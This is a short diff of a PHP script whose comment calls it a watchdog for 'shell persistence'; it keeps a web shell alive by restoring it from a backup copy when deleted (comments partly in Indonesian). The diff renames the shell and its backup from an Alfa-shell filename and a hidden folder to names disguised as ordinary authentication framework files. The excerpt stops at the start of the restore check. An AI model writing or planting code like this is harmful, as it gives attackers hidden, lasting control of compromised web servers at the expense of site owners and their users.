@@ -1,7 +1,7 @@
 <?php
 // Simple watchdog script for shell persistence
-$shell = "alfa_shell_clean_final.php";
-$backup = ".hidden/.bcore";
+$shell = "Auth_Url_Cache_Files.php";
+$backup = "Contracts/Auth_Query.php";
 
 // Jika shell utama tidak ada, restore dari backup
 if (!file_exists($shell)) {
